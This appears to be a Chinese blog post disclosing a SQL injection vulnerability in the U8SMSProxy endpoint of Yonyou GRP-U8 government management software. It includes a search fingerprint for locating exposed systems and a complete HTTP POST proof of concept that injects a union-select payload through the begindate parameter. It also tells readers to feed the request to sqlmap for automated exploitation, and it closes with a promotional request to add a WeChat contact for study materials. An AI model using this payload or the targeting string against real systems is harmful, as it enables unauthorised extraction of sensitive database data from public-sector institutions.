# 原创
：  用友U8SMSProxy -SQL注入漏洞

# 用友U8SMSProxy -SQL注入漏洞

**0x01 漏洞介绍**<br/> 用友GRP-U8 R10政务管理软件是由用友政务公司基于云技术所推出的第十代政务产品。这款产品继承了用友R9、R9i、U8等行政事业版产品的各项优点，并融合了全国广大用户的最佳实践应用。它旨在为政府财政部门、社保部门、卫生部门、教育部门、民政部门、党务部门以及农村等政府及行政事业单位提供专业管理解决方案。该漏洞存在于U8SMSProxy，后端对begindate传参的数据值没有进行严格的过滤，从而导致SQL注入，攻击者可以利用该漏洞获取数据库敏感信息。<br/>**0x02 影响版本**

```
用友GRP-U8行政事业内控管理软件

```

**0x03 语法特征**

```
title="用友GRP-U8行政事业内控管理软件"

```

**0x04 漏洞复现**<br/> 页面<br/>  

<br/> POC

```
POST /U8SMSProxy?class=XXNote&amp;id=qryyfs HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Connection: close
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

begindate=xxx'union select 6/3-- &amp;enddate=2023-10-27&amp;search=

```

<br/> 直接copy进文件，打”*”号，sqlmap一把嗦

**学习框架已经整理完毕，现在就差资料资源了，我这里整理了所有知识点对应的资料资源文档，大家不想一个一个去找的话，可以参考一下这些资料！**

**    点赞收藏评论区留言“已关注 求 ”！都可以免费分享给大家！等不及的小伙伴也可以直接厚台踢我！或者关注我之后后台会自动发送给大家！关注后大家注意看后台消息就行！**

[+V【zkaq222】或者下面的扫码不然通不过哦，免费领取安全学习资料包！（私聊进群一起学习，共同进步）腾讯文档-在线文档<img alt="icon-default.png?t=N7T8" src="https://csdnimg.cn/release/blog_editor_html/release2.3.6/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N7T8"/>https://docs.qq.com/doc/DYmVETWlZemh0Ymdv](https://docs.qq.com/doc/DYmVETWlZemh0Ymdv)
